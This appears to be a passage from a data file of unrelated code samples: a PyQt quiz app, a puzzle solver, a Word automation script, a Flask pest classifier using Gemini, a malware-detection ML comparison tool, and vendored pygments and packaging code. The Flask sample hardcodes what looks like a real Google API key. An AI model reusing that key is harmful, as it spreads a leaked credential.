\u0441\u043f\u0440\u044f\u0442\u0430\u0442\u044c \u0433\u0440\u0443\u043f\u043f\u0443 \u0441 \u0432\u0430\u0440\u0438\u0430\u043d\u0442\u0430\u043c\u0438 \u043e\u0442\u0432\u0435\u0442\u043e\u0432\r\n    grp_box_result.show()  # \u043f\u043e\u043a\u0430\u0437\u0430\u0442\u044c \u0433\u0440\u0443\u043f\u043f\u0443 \u0441 \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442\u043e\u043c\r\n    btn.setText('\u0421\u043b\u0435\u0434\u0443\u044e\u0449\u0438\u0439 \u0432\u043e\u043f\u0440\u043e\u0441')  # \u043c\u0435\u043d\u044f\u0435\u043c \u0442\u0435\u043a\u0441\u0442 \u043d\u0430 \u043a\u043d\u043e\u043f\u043a\u0435\r\n    check_answer()  # \u0432\u044b\u0437\u043e\u0432 \u0444\u0443\u043d\u043a\u0446\u0438\u0438 \u0434\u043b\u044f \u043f\u0440\u043e\u0432\u0435\u0440\u043a\u0438 \u043e\u0442\u0432\u0435\u0442\u0430\r\n\r\ndef show_question():  # \u0444\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u043f\u043e\u043a\u0430\u0437\u0430 \u0432\u043e\u043f\u0440\u043e\u0441\u0430 \u0438 \u0432\u0430\u0440\u0438\u0430\u043d\u0442\u043e\u0432 \u043e\u0442\u0432\u0435\u0442\u0430\r\n    next_question()  # \u0432\u044b\u0437\u043e\u0432 \u0444\u0443\u043d\u043a\u0446\u0438\u0438 \u0434\u043b\u044f \u043e\u0442\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044f \u0441\u043b\u0435\u0434\u0443\u044e\u0449\u0435\u0433\u043e \u0432\u043e\u043f\u0440\u043e\u0441\u0430\r\n    grp_box.show()  # \u043f\u043e\u043a\u0430\u0437\u0430\u0442\u044c \u0433\u0440\u0443\u043f\u043f\u0443 \u0441 \u0432\u0430\u0440\u0438\u0430\u043d\u0442\u0430\u043c\u0438 \u043e\u0442\u0432\u0435\u0442\u043e\u0432\r\n    grp_box_result.hide()  # \u0441\u043f\u0440\u044f\u0442\u0430\u0442\u044c \u0433\u0440\u0443\u043f\u043f\u0443 \u0441 \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442\u043e\u043c\r\n    btn.setText('\u041e\u0442\u0432\u0435\u0442\u0438\u0442\u044c')  # \u043c\u0435\u043d\u044f\u0435\u043c \u0442\u0435\u043a\u0441\u0442 \u043d\u0430 \u043a\u043d\u043e\u043f\u043a\u0435\r\n    radio_group.setExclusive(False)  # \u0441\u043d\u0438\u043c\u0430\u0435\u043c \u043e\u0433\u0440\u0430\u043d\u0438\u0447\u0435\u043d\u0438\u0435 \u043d\u0430 \u0432\u044b\u0431\u043e\u0440 \u0432\u0430\u0440\u0438\u0430\u043d\u0442\u043e\u0432\r\n    radio1.setChecked(False)  # \u0434\u0435\u043b\u0430\u0435\u043c \u043a\u043d\u043e\u043f\u043a\u0443 \u21161 \u043d\u0435 \u043d\u0430\u0436\u0430\u0442\u043e\u0439\r\n    radio2.setChecked(False)  # \u0434\u0435\u043b\u0430\u0435\u043c \u043a\u043d\u043e\u043f\u043a\u0443 \u21162 \u043d\u0435 \u043d\u0430\u0436\u0430\u0442\u043e\u0439\r\n    radio3.setChecked(False)  # \u0434\u0435\u043b\u0430\u0435\u043c \u043a\u043d\u043e\u043f\u043a\u0443 \u21163 \u043d\u0435 \u043d\u0430\u0436\u0430\u0442\u043e\u0439\r\n    radio4.setChecked(False)  # \u0434\u0435\u043b\u0430\u0435\u043c \u043a\u043d\u043e\u043f\u043a\u0443 \u21164 \u043d\u0435 \u043d\u0430\u0436\u0430\u0442\u043e\u0439\r\n    radio_group.setExclusive(True)  # \u0432\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u043c \u043e\u0433\u0440\u0430\u043d\u0438\u0447\u0435\u043d\u0438\u0435 \u043d\u0430 \u0432\u044b\u0431\u043e\u0440 \u0432\u0430\u0440\u0438\u0430\u043d\u0442\u043e\u0432\r\n\r\ndef start_test():  # \u0444\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u0432\u044b\u0431\u043e\u0440\u0430 \u0440\u0435\u0430\u043a\u0446\u0438\u0438 \u043d\u0430 \u043d\u0430\u0436\u0430\u0442\u0438\u0435 \u043d\u0430 \u043a\u043d\u043e\u043f\u043a\u0443\r\n    if btn.text() == '\u041e\u0442\u0432\u0435\u0442\u0438\u0442\u044c':  # \u0435\u0441\u043b\u0438 \u043d\u0430 \u043a\u043d\u043e\u043f\u043a\u0435 \u0442\u0435\u043a\u0441\u0442 \"\u041e\u0442\u0432\u0435\u0442\u0438\u0442\u044c\"\r\n        show_result()  # \u0442\u043e \u0437\u0430\u043f\u0443\u0441\u043a\u0430\u0435\u043c \u0444\u0443\u043d\u043a\u0446\u0438\u044e show_result\r\n    else:  # \u0438\u043d\u0430\u0447\u0435\r\n        show_question()  # \u0437\u0430\u043f\u0443\u0441\u043a\u0430\u0435\u043c \u0444\u0443\u043d\u043a\u0446\u0438\u044e show_question\r\n\r\napp = QApplication([])  # \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u044d\u043a\u0437\u0435\u043c\u043f\u043b\u044f\u0440\u0430 \u043f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u044f\r\nwin = QWidget()  # \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u0433\u043b\u0430\u0432\u043d\u043e\u0433\u043e \u043e\u043a\u043d\u0430\r\nwin.setWindowTitle('MemoryCard')  # \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430 \u0437\u0430\u0433\u043e\u043b\u043e\u0432\u043a\u0430 \u0434\u043b\u044f \u043e\u043a\u043d\u0430\r\nwin.resize(400, 300)  # \u0438\u0437\u043c\u0435\u043d\u0435\u043d\u0438\u0435 \u0440\u0430\u0437\u043c\u0435\u0440\u0430 \u043e\u043a\u043d\u0430\r\nwin.q_index = 0  # \u0441\u043e\u0437\u0434\u0430\u043b\u0438 \u0438\u043d\u0434\u0435\u043a\u0441 \u0432\u043e\u043f\u0440\u043e\u0441\u0430\r\nwin.score = 0\r\nwin.total = len(questions)\r\n\r\nquestion_text = QLabel('\u0422\u0443\u0442 \u0431\u0443\u0434\u0435\u0442 \u0432\u043e\u043f\u0440\u043e\u0441')  # \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u0432\u0438\u0434\u0436\u0435\u0442\u0430 \u0442\u0435\u043a\u0441\u0442\u0430 \u0434\u043b\u044f \u0432\u043e\u043f\u0440\u043e\u0441\u0430\r\ngrp_box = QGroupBox('\u0412\u0430\u0440\u0438\u0430\u043d\u0442\u044b \u043e\u0442\u0432\u0435\u0442\u0430')  # \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u0432\u0438\u0434\u0436\u0435\u0442\u0430 \u0433\u0440\u0443\u043f\u043f\u044b\r\nradio1 = QRadioButton('1 \u0432\u0430\u0440\u0438\u0430\u043d\u0442')  # \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u0432\u0438\u0434\u0436\u0435\u0442\u0430 \u043a\u043d\u043e\u043f\u043a\u0438 \u0432\u0430\u0440\u0438\u0430\u043d\u0442\u0430 \u043e\u0442\u0432\u0435\u0442\u0430\r\nradio2 = QRadioButton('2 \u0432\u0430\u0440\u0438\u0430\u043d\u0442')  # \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u0432\u0438\u0434\u0436\u0435\u0442\u0430 \u043a\u043d\u043e\u043f\u043a\u0438 \u0432",
    "\"\"\"Code to hepl solve the Jane Street puzzle for March 2024.\"\"\"\n\nimport fire\nimport json\nimport tqdm\n\nfrom itertools import combinations, permutations\n\n\nTEMPLATE = [\n    ((0, 1), 18),\n    ((0, 6), 7),\n    ((1, 4), 12),\n    ((2, 2), 9),\n    ((2, 7), 31),\n    ((4, 1), 5),\n    ((4, 3), 11),\n    ((4, 5), 22),\n    ((4, 7), 22),\n    ((6, 1), 9),\n    ((6, 6), 19),\n    ((7, 4), 14),\n    ((8, 2), 22),\n    ((8, 7), 15),\n]\nTEST_TEMPLATE = [\n    ((0, 0), 0),\n    ((1, 2), 9),\n    ((1, 4), 7),\n    ((2, 0), 8),\n    ((3, 2), 15),\n    ((3, 4), 12),\n    ((4, 0), 10),\n]\n\n\ndef transpose(grid: list[list[int]]) -> list[list[int]]:\n    \"\"\"\n    Transpose a 2D grid.\n    \"\"\"\n\n    return [[row[i] for row in grid] for i in range(len(grid[0]))]\n\n\ndef list_2_grid(grid_list: list[int], num_order: list[int]) -> list[list[int]]:\n    \"\"\"\n    Convert a list of integers to a 2D grid. 4^8 = 65536 possible grids.\n    \"\"\"\n\n    # all need to be 0, 1, 2, 3\n    assert all(1 <= x <= 4 for x in grid_list)\n\n    template = [[1]]\n\n    for i in range(len(grid_list)):\n        if grid_list[i] == 1:\n            template.insert(0, [num_order[i]] * len(template[0]))\n            template = transpose(template)\n            template.append([num_order[i]] * len(template[0]))\n            template = transpose(template)\n        if grid_list[i] == 2:\n            template.insert(0, [num_order[i]] * len(template[0]))\n            template = transpose(template)\n            template.insert(0, [num_order[i]] * len(template[0]))\n            template = transpose(template)\n        if grid_list[i] == 3:\n            template.append([num_order[i]] * len(template[0]))\n            template = transpose(template)\n            template.insert(0, [num_order[i]] * len(template[0]))\n            template = transpose(template)\n        if grid_list[i] == 4:\n            template.append([num_order[i]] * len(template[0]))\n            template = transpose(template)\n            template.append([num_order[i]] * len(template[0]))\n            template = transpose(template)\n\n    return template\n\n\ndef combinations_of_4m(m) -> list[list[int]]:\n    \"\"\"generate all lists of length m with all entries are in 1, 2, 3, 4.\"\"\"\n\n    def _append(m, current=[], result=[]) -> None:\n        \"\"\"Recursive implementation\"\"\"\n        if m == 0:\n            result.append(current)\n            return None\n        for digit in range(1, 5):\n            _append(m - 1, current + [digit], result)\n        return None\n\n    result = []\n    _append(m, [], result)\n    return result\n\n\ndef sum_of_combinations(numbers):\n    # Using a set to avoid duplicate sums\n    sums_set = set()\n\n    # Generate combinations of all lengths and calculate their sums\n    for r in range(1, len(numbers) + 1):\n        for combo in combinations(numbers, r):\n            sums_set.add(sum(combo))\n\n    # Convert the set to a sorted list before returning\n    return sorted(list(sums_set))\n\n\ndef process_grid(\n    grid: list[list[int]], template: list[tuple[tuple[int, int], int]]\n) -> bool:\n    \"\"\"\n    Process a grid and check if it fits with the numbers in the template.\n    \"\"\"\n    legnth = len(grid)\n\n    for pos, value in template:\n        if grid[pos[0]][pos[1]] == 1:\n            return False\n\n        nums = []\n        if pos[0] > 0:\n            nums.append(grid[pos[0] - 1][pos[1]])\n        if pos[0] < legnth - 1:\n            nums.append(grid[pos[0] + 1][pos[1]])\n        if pos[1] > 0:\n            nums.append(grid[pos[0]][pos[1] - 1])\n        if pos[1] < legnth - 1:\n            nums.append(grid[pos[0]][pos[1] + 1])\n\n        if value not in sum_of_combinations(nums) and value != 0:\n            return False\n\n    return True\n\n\ndef all_permutations(lwr=2, upr=9):\n    numbers = range(lwr, upr + 1)  # Numbers from 2 to 9\n    all_perms = [list(perm) for perm in permutations(numbers)]\n\n    return all_perms\n\n\ndef main(\n    test: bool = False,\n):\n\n    if test:\n        k_size_grid = 5\n        save_file = \"test_solutions.json\"\n        template = TEST_TEMPLATE\n    else:\n        k_size_grid = 9\n        save_file = \"solutions.json\"\n        template = TEMPLATE\n\n    combs = combinations_of_4m(k_size_grid - 1)\n\n    num_orders = all_permutations(lwr=2, upr=k_size_grid)\n    new_num_orders = []\n    for num_order in num_orders:\n        for i in range(len(num_order)):\n            if num_order[i] > 2 * (i + 1) + 1:\n                grid_list = combs[0]\n                grid = list_2_grid(grid_list, num_order)\n                break\n        else:\n            new_num_orders.append(num_order)\n\n    num_orders = new_num_orders\n\n    grid_work_set = []\n    num_work_set = []\n    for num_order in tqdm.tqdm(num_orders):\n        for grid_list in combs:\n            grid_list.reverse()\n            grid = list_2_grid(grid_list, num_order)\n\n            if process_grid(grid, template):\n                grid_work_set.append(grid)\n                tupples = [(num_order[i], grid_list[i]) for i in range(len(num_order))]\n                num_work_set.append(tupples)\n\n                with open(save_file, \"w\") as ",
    "import subprocess\nimport pyautogui as pag\nimport time\n\n#opening word application \nprocess = subprocess.Popen(\"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Word.lnk\", shell=True)\ntime.sleep(2)\n\n#opening the file \npag.hotkey('alt', 'f')\npag.press('o')\npag.press('e')\npag.write('dataset')\ntime.sleep(2)\npag.press('enter')\n\n# #waiting for file to open\ntime.sleep(30)\n\n# #translating the page\npag.hotkey('alt', 'r')\npag.press('l')\npag.press('down')\npag.press('enter')\n\n# #waiting for file to finish translating\n\n\n# #saving the page into src folder\npag.hotkey('alt', 'f')\npag.press('a')\ntime.sleep(2)\npag.press('o')\ntime.sleep(2)\npag.write('translated_text')\npag.hotkey('alt', 'd')\npag.write(r'C:\\Users\\ASUS\\Desktop\\Practice\\src')\npag.hotkey('alt', 's')\n\n# #close window\ntime.sleep(2)\npag.hotkey('alt', 'f4')\ntime.sleep(2)\npag.hotkey('alt', 'f4')\n\n# #task 1 and also extracting the doc into txt\ntime.sleep(3)\nimport docx\ndoc = docx.Document('src/translated_text.docx')\ntext = \"\"\nfor paragraph in doc.paragraphs:\n    text += paragraph.text + \"\\n\"\n\nfile = open('src/translated_text.txt', 'w', encoding='utf-8')\nfile.write(text)\nfile.close()\n\n\n\n\n\n\n",
    "from flask import Flask, render_template, request\nfrom tensorflow.keras.models import load_model\nfrom tensorflow.keras.preprocessing import image\nimport numpy as np\nimport os\nimport google.generativeai as genai\n\napp = Flask(__name__)\n\n# Load the trained machine learning model\nmodel = load_model('insect_model1.h5')\n\n# Define class names\nclass_names = [\n    'Africanized Honey Bees (Killer Bees)',\n    'Aphids',\n    'Armyworms',\n    'Brown Marmorated Stink Bugs',\n    'Cabbage Loopers',\n    'Citrus Canker',\n    'Colorado Potato Beetles',\n    'Corn Borers',\n    'Corn Earworms',\n    'Fall Armyworms',\n    'Fruit Flies',\n    'Spider Mites',\n    'Thrips',\n    'Tomato Hornworms',\n    'Western Corn Rootworms'\n]\n\n# Create a dictionary to map numeric index to class names\nindex_to_class = {i: class_name for i, class_name in enumerate(class_names)}\n\n# Function to preprocess image data\ndef preprocess_image(img):\n    # Preprocess the image as required by your model\n    img = image.load_img(img, target_size=(224, 224))  # Resize the image to match input shape\n    img = image.img_to_array(img)\n    img = img / 255.0  # Normalize pixel values\n    img = np.expand_dims(img, axis=0)  # Add batch dimension\n    return img\n\n@app.route('/')\ndef home():\n    return render_template('home.html')\n\n@app.route('/predict', methods=['POST','GET'])\ndef predict():\n    if 'image' not in request.files:\n        return render_template('prediction.html', error='No file part')\n\n    img_file = request.files['image']\n    \n    if img_file.filename == '':\n        return render_template('prediction.html', error='No selected file')\n\n    img_path = os.path.join('static', 'uploads', img_file.filename)\n    img_file.save(img_path)\n\n    if not os.path.exists(img_path):\n        return render_template('prediction.html', error='Failed to save the uploaded image.')\n\n    processed_img = preprocess_image(img_path)\n    prediction = model.predict(processed_img)\n    \n    predicted_index = np.argmax(prediction)\n    predicted_class = index_to_class.get(predicted_index, \"Unknown\")\n\n    genai.configure(api_key=\"AIzaSyA6Bkhpmh6MY2-whmHejhRUsnA286YsExI\")\n    generation_config = {\n            \"temperature\": 0.9,\n            \"top_p\": 1,\n            \"top_k\": 1,\n            \"max_output_tokens\": 2048,\n        }\n    \n    safety_settings = [\n            {\n                \"category\": \"HARM_CATEGORY_HARASSMENT\",\n                \"threshold\": \"BLOCK_MEDIUM_AND_ABOVE\"\n            },\n            {\n                \"category\": \"HARM_CATEGORY_HATE_SPEECH\",\n                \"threshold\": \"BLOCK_MEDIUM_AND_ABOVE\"\n            },\n            {\n                \"category\": \"HARM_CATEGORY_SEXUALLY_EXPLICIT\",\n                \"threshold\": \"BLOCK_MEDIUM_AND_ABOVE\"\n            },\n            {\n                \"category\": \"HARM_CATEGORY_DANGEROUS_CONTENT\",\n                \"threshold\": \"BLOCK_MEDIUM_AND_ABOVE\"\n            },\n        ]\n    model1 = genai.GenerativeModel(model_name=\"gemini-1.0-pro\",\n                                      generation_config=generation_config,\n                                      safety_settings=safety_settings)\n    user_prompt = f\"can you give more details about {predicted_class} in 100 words?\"\n    convo = model1.start_chat(history=[\n  {\n    \"role\": \"user\",\n    \"parts\": [\"car\"]\n  },\n  {\n    \"role\": \"model\",\n    \"parts\": [\"**Noun**\\n\\n1. A motor vehicle with four wheels, an engine that powers it, and seats for one to eight people.\\n2. A railway carriage for passengers.\\n3. A cable car or funicular railway.\\n4. (informal) A stolen vehicle.\\n\\n**Verb**\\n\\n1. To transport or drive (someone or something) in a car.\\n2. (slang) To steal (a car).\\n\\n**Examples**\\n\\n1. We drove to the beach in my new car.\\n2. The car was parked illegally.\\n3. The car was stolen from the driveway.\\n4. The thief was arrested for car theft.\\n\\n**Synonyms**\\n\\n* Automobile\\n* Vehicle\\n* Motor car\\n* Coach\\n* Saloon\\n* Sedan\\n* Coupe\\n* Hatchback\\n* Estate car\\n* Station wagon\\n* SUV\\n* Crossover\"]\n  },\n])\n\n        # Send the user query and receive the response\n    convo.send_message(user_prompt)\n    details=convo.last.text\n    print(convo.last.text)\n\n    \n\n    return render_template('prediction_result.html', prediction=predicted_class,details=details)\n\n@app.route('/solution', methods=['POST', 'GET'])\ndef solution():\n    if request.method == 'POST':\n        pest = request.form['pest']\n        \n        # Configure the API key for authentication\n        genai.configure(api_key=\"AIzaSyA6Bkhpmh6MY2-whmHejhRUsnA286YsExI\")\n\n        # Set up the model\n        generation_config = {\n            \"temperature\": 0.9,\n            \"top_p\": 1,\n            \"top_k\": 1,\n            \"max_output_tokens\": 2048,\n        }\n\n        safety_settings = [\n            {\n                \"category\": \"HARM_CATEGORY_HARASSMENT\",\n                \"threshold\": \"BLOCK_MEDIUM_AND_ABOVE\"\n            },\n            {\n                \"category\": \"HARM_CATEGORY_HATE_SPEECH\",\n                \"threshold\": \"BLOCK_MEDIUM_AND_ABOVE\"\n            },\n      ",
    "from tkinter import messagebox\r\nfrom tkinter import *\r\nfrom tkinter.filedialog import askopenfilename\r\nfrom tkinter import simpledialog\r\nimport tkinter\r\nimport numpy as np\r\nfrom tkinter import filedialog\r\nimport pandas as pd \r\nfrom sklearn.model_selection import train_test_split \r\nfrom sklearn.metrics import accuracy_score \r\nimport matplotlib.pyplot as plt\r\nfrom sklearn.naive_bayes import BernoulliNB\r\nfrom sklearn.neighbors import KNeighborsClassifier\r\nfrom sklearn.tree import DecisionTreeClassifier\r\nfrom sklearn.metrics import precision_score\r\nfrom sklearn.metrics import recall_score\r\nfrom sklearn.metrics import f1_score\r\nfrom sklearn.metrics import accuracy_score\r\nfrom sklearn.ensemble import RandomForestClassifier\r\nfrom sklearn import svm\r\nfrom keras.models import Sequential\r\nfrom keras.layers import Convolution2D\r\nfrom keras.layers import MaxPooling2D\r\nfrom keras.layers import Flatten\r\nfrom keras.layers import Dense,Activation,BatchNormalization,Dropout\r\nfrom sklearn.preprocessing import OneHotEncoder\r\nfrom keras.models import model_from_json\r\nfrom keras.layers import LSTM\r\nfrom sklearn.preprocessing import StandardScaler\r\nfrom sklearn.preprocessing import Normalizer\r\nimport keras.layers\r\nfrom keras.models import model_from_json\r\n\r\nmain = tkinter.Tk()\r\nmain.title(\"Malware Detection Using Deep Learning\")\r\nmain.geometry(\"1300x1200\")\r\n\r\nmalware_name = ['Dialer Adialer.C','Backdoor Agent.FYI','Worm Allaple.A','Worm Allaple.L','Trojan Alueron.gen','Worm:AutoIT Autorun.K',\r\n'Trojan C2Lop.P','Trojan C2Lop.gen','Dialer Dialplatform.B','Trojan Downloader Dontovo.A','Rogue Fakerean','Dialer Instantaccess',\r\n'PWS Lolyda.AA 1','PWS Lolyda.AA 2','PWS Lolyda.AA 3','PWS Lolyda.AT','Trojan Malex.gen','Trojan Downloader Obfuscator.AD',\r\n'Backdoor Rbot!gen','Trojan Skintrim.N','Trojan Downloader Swizzor.gen!E','Trojan Downloader Swizzor.gen!I','Worm VB.AT',\r\n'Trojan Downloader Wintrim.BX','Worm Yuner.A']\r\n\r\n\r\nglobal filename\r\nglobal knn_precision,nb_precision,tree_precision,svm_precision,random_precision,cnn_precision,lstm_precision\r\nglobal knn_recall,nb_recall,tree_recall,svm_recall,random_recall,cnn_recall,lstm_recall\r\nglobal knn_fmeasure,nb_fmeasure,tree_fmeasure,svm_fmeasure,random_fmeasure,cnn_fmeasure,lstm_fmeasure\r\nglobal knn_acc,nb_acc,tree_acc,svm_acc,random_acc,cnn_acc,lstm_acc\r\n\r\nglobal classifier\r\nglobal X_train, X_test, y_train, y_test\r\n\r\ndef load_lstmcnn(dataset, standardize=True):\r\n    features = dataset['arr'][:, 0]\r\n    features = np.array([feature for feature in features])\r\n    features = np.reshape(features, (features.shape[0], features.shape[1] * features.shape[2]))\r\n    if standardize:\r\n        features = StandardScaler().fit_transform(features)\r\n\r\n    labels = dataset['arr'][:, 1]\r\n    labels = np.array([label for label in labels])\r\n    \r\n    print(labels.shape)\r\n    print(features.shape)\r\n    \r\n    return features, labels\r\n\r\ndef load_data(dataset, standardize=True):\r\n    features = dataset['arr'][:, 0]\r\n    features = np.array([feature for feature in features])\r\n    features = np.reshape(features, (features.shape[0], features.shape[1] * features.shape[2]))\r\n    if standardize:\r\n        features = StandardScaler().fit_transform(features)\r\n\r\n    labels = dataset['arr'][:, 1]\r\n    labels = np.array([label for label in labels])\r\n\r\n    feature = []\r\n    label = []\r\n    for i in range(0,4000): \r\n        feature.append(features[i])\r\n        label.append(labels[i])\r\n\r\n    feature = np.asarray(feature)\r\n    label = np.asarray(label)\r\n    print(labels.shape)\r\n    print(features.shape)\r\n    print(label.shape)\r\n    print(feature.shape)\r\n    return feature, label\r\n\r\n\r\ndef upload():\r\n    global filename\r\n    filename = filedialog.askopenfilename(initialdir = \"dataset\")\r\n    pathlabel.config(text=filename)\r\n    text.delete('1.0', END)\r\n    text.insert(END,'MalImg dataset loaded\\n')\r\n    \r\n\r\ndef prediction(X_test, cls): \r\n    y_pred = cls.predict(X_test) \r\n    for i in range(len(X_test)):\r\n      print(\"X=%s, Predicted=%s\" % (X_test[i], y_pred[i]))\r\n    return y_pred \r\n\t\r\ndef KNN():\r\n    global knn_precision\r\n    global knn_recall\r\n    global knn_fmeasure\r\n    global knn_acc\r\n    text.delete('1.0', END)\r\n    cls = KNeighborsClassifier(n_neighbors = 10) \r\n    cls.fit(X_train, y_train) \r\n    text.insert(END,\"KNN Prediction Results\\n\\n\") \r\n    prediction_data = prediction(X_test, cls)\r\n    knn_precision = precision_score(y_test, prediction_data,average='micro') * 100\r\n    knn_recall = recall_score(y_test, prediction_data,average='micro') * 100\r\n    knn_fmeasure = f1_score(y_test, prediction_data,average='micro') * 100\r\n    knn_acc = accuracy_score(y_test,prediction_data)*100\r\n    text.insert(END,\"KNN Precision : \"+str(knn_precision)+\"\\n\")\r\n    text.insert(END,\"KNN Recall : \"+str(knn_recall)+\"\\n\")\r\n    text.insert(END,\"KNN FMeasure : \"+str(knn_fmeasure)+\"\\n\")\r\n    text.insert(END,\"KNN Accuracy : \"+str(knn_acc)+\"\\n\")\r\n    \r\ndef naivebayes():\r\n    global nb_precision\r\n    global nb_recall\r\n    global nb_fmeasure\r\n    glo",
    "\"\"\"\n    pygments.filters\n    ~~~~~~~~~~~~~~~~\n\n    Module containing filter lookup functions and default\n    filters.\n\n    :copyright: Copyright 2006-2023 by the Pygments team, see AUTHORS.\n    :license: BSD, see LICENSE for details.\n\"\"\"\n\nimport re\n\nfrom pip._vendor.pygments.token import String, Comment, Keyword, Name, Error, Whitespace, \\\n    string_to_tokentype\nfrom pip._vendor.pygments.filter import Filter\nfrom pip._vendor.pygments.util import get_list_opt, get_int_opt, get_bool_opt, \\\n    get_choice_opt, ClassNotFound, OptionError\nfrom pip._vendor.pygments.plugin import find_plugin_filters\n\n\ndef find_filter_class(filtername):\n    \"\"\"Lookup a filter by name. Return None if not found.\"\"\"\n    if filtername in FILTERS:\n        return FILTERS[filtername]\n    for name, cls in find_plugin_filters():\n        if name == filtername:\n            return cls\n    return None\n\n\ndef get_filter_by_name(filtername, **options):\n    \"\"\"Return an instantiated filter.\n\n    Options are passed to the filter initializer if wanted.\n    Raise a ClassNotFound if not found.\n    \"\"\"\n    cls = find_filter_class(filtername)\n    if cls:\n        return cls(**options)\n    else:\n        raise ClassNotFound('filter %r not found' % filtername)\n\n\ndef get_all_filters():\n    \"\"\"Return a generator of all filter names.\"\"\"\n    yield from FILTERS\n    for name, _ in find_plugin_filters():\n        yield name\n\n\ndef _replace_special(ttype, value, regex, specialttype,\n                     replacefunc=lambda x: x):\n    last = 0\n    for match in regex.finditer(value):\n        start, end = match.start(), match.end()\n        if start != last:\n            yield ttype, value[last:start]\n        yield specialttype, replacefunc(value[start:end])\n        last = end\n    if last != len(value):\n        yield ttype, value[last:]\n\n\nclass CodeTagFilter(Filter):\n    \"\"\"Highlight special code tags in comments and docstrings.\n\n    Options accepted:\n\n    `codetags` : list of strings\n       A list of strings that are flagged as code tags.  The default is to\n       highlight ``XXX``, ``TODO``, ``FIXME``, ``BUG`` and ``NOTE``.\n\n    .. versionchanged:: 2.13\n       Now recognizes ``FIXME`` by default.\n    \"\"\"\n\n    def __init__(self, **options):\n        Filter.__init__(self, **options)\n        tags = get_list_opt(options, 'codetags',\n                            ['XXX', 'TODO', 'FIXME', 'BUG', 'NOTE'])\n        self.tag_re = re.compile(r'\\b(%s)\\b' % '|'.join([\n            re.escape(tag) for tag in tags if tag\n        ]))\n\n    def filter(self, lexer, stream):\n        regex = self.tag_re\n        for ttype, value in stream:\n            if ttype in String.Doc or \\\n               ttype in Comment and \\\n               ttype not in Comment.Preproc:\n                yield from _replace_special(ttype, value, regex, Comment.Special)\n            else:\n                yield ttype, value\n\n\nclass SymbolFilter(Filter):\n    \"\"\"Convert mathematical symbols such as \\\\<longrightarrow> in Isabelle\n    or \\\\longrightarrow in LaTeX into Unicode characters.\n\n    This is mostly useful for HTML or console output when you want to\n    approximate the source rendering you'd see in an IDE.\n\n    Options accepted:\n\n    `lang` : string\n       The symbol language. Must be one of ``'isabelle'`` or\n       ``'latex'``.  The default is ``'isabelle'``.\n    \"\"\"\n\n    latex_symbols = {\n        '\\\\alpha'                : '\\U000003b1',\n        '\\\\beta'                 : '\\U000003b2',\n        '\\\\gamma'                : '\\U000003b3',\n        '\\\\delta'                : '\\U000003b4',\n        '\\\\varepsilon'           : '\\U000003b5',\n        '\\\\zeta'                 : '\\U000003b6',\n        '\\\\eta'                  : '\\U000003b7',\n        '\\\\vartheta'             : '\\U000003b8',\n        '\\\\iota'                 : '\\U000003b9',\n        '\\\\kappa'                : '\\U000003ba',\n        '\\\\lambda'               : '\\U000003bb',\n        '\\\\mu'                   : '\\U000003bc',\n        '\\\\nu'                   : '\\U000003bd',\n        '\\\\xi'                   : '\\U000003be',\n        '\\\\pi'                   : '\\U000003c0',\n        '\\\\varrho'               : '\\U000003c1',\n        '\\\\sigma'                : '\\U000003c3',\n        '\\\\tau'                  : '\\U000003c4',\n        '\\\\upsilon'              : '\\U000003c5',\n        '\\\\varphi'               : '\\U000003c6',\n        '\\\\chi'                  : '\\U000003c7',\n        '\\\\psi'                  : '\\U000003c8',\n        '\\\\omega'                : '\\U000003c9',\n        '\\\\Gamma'                : '\\U00000393',\n        '\\\\Delta'                : '\\U00000394',\n        '\\\\Theta'                : '\\U00000398',\n        '\\\\Lambda'               : '\\U0000039b',\n        '\\\\Xi'                   : '\\U0000039e',\n        '\\\\Pi'                   : '\\U000003a0',\n        '\\\\Sigma'                : '\\U000003a3',\n        '\\\\Upsilon'              : '\\U000003a5',\n        '\\\\Phi'                  : '\\U000003a6',\n        '\\\\Psi'                  : '\\U000003a8',\n        '\\\\Omega'                : '\\U000003a9',\n",
    "# This file is dual licensed under the terms of the Apache License, Version\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\n# for complete details.\n\nimport urllib.parse\nfrom typing import Any, List, Optional, Set\n\nfrom ._parser import parse_requirement as _parse_requirement\nfrom ._tokenizer import ParserSyntaxError\nfrom .markers import Marker, _normalize_extra_values\nfrom .specifiers import SpecifierSet\n\n\nclass InvalidRequirement(ValueError):\n    \"\"\"\n    An invalid requirement was found, users should refer to PEP 508.\n    \"\"\"\n\n\nclass Requirement:\n    \"\"\"Parse a requirement.\n\n    Parse a given requirement string into its parts, such as name, specifier,\n    URL, and extras. Raises InvalidRequirement on a badly-formed requirement\n    string.\n    \"\"\"\n\n    # TODO: Can we test whether something is contained within a requirement?\n    #       If so how do we do that? Do we need to test against the _name_ of\n    #       the thing as well as the version? What about the markers?\n    # TODO: Can we normalize the name and extra name?\n\n    def __init__(self, requirement_string: str) -> None:\n        try:\n            parsed = _parse_requirement(requirement_string)\n        except ParserSyntaxError as e:\n            raise InvalidRequirement(str(e)) from e\n\n        self.name: str = parsed.name\n        if parsed.url:\n            parsed_url = urllib.parse.urlparse(parsed.url)\n            if parsed_url.scheme == \"file\":\n                if urllib.parse.urlunparse(parsed_url) != parsed.url:\n                    raise InvalidRequirement(\"Invalid URL given\")\n            elif not (parsed_url.scheme and parsed_url.netloc) or (\n                not parsed_url.scheme and not parsed_url.netloc\n            ):\n                raise InvalidRequirement(f\"Invalid URL: {parsed.url}\")\n            self.url: Optional[str] = parsed.url\n        else:\n            self.url = None\n        self.extras: Set[str] = set(parsed.extras if parsed.extras else [])\n        self.specifier: SpecifierSet = SpecifierSet(parsed.specifier)\n        self.marker: Optional[Marker] = 